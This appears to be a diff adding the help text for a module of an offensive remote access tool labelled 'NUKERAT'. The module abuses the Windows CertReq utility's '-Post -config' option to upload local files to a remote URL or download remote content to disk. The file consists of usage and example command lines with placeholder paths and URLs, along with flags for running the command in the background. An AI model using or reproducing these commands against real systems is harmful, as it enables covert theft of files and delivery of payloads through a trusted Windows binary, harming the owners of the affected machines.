@@ -1,0 +1,23 @@
+ABOUT
+    Certificate enrollment and request utility.
+    Abuses CertReq -Post -config to upload local files or download HTTP
+    responses to disk.
+
+USAGE:
+    CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
+    CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
+
+ARGUMENTS:
+    -Post                        HTTP POST payload to config URL
+    -config                      Target URL for POST
+
+EXAMPLES:
+    CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
+    CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
